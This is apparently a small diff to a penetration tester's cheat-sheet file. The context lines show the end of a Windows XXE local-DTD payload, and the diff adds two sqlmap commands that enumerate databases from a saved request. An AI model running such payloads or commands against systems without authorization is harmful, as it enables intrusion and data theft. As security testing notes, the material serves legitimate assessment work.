@@ -57,3 +57,11 @@ XXE Local DTD (Windows)
     >
     %local_dtd;
   ]><xxx>anything</xxx>
+
+*******************************************************************************************************************************
+
+SQLMap Commands:
+
+sqlmap -r sqlfile –dbs --batch
+sqlmap -r sqlfile -D <database_name> –dbs --batch
+
